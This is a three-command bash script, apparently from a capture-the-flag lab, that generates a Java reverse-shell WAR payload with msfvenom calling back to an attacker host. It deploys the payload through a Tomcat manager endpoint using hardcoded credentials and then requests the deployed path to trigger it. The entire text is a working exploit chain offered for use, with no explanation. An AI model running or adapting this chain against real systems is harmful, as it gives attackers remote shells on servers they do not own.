#!bin/bash
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.19 lport=1212 -f war -o vaina.war
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/salsa --upload-file vaina.war
curl http://10.10.10.194:8080/salsa
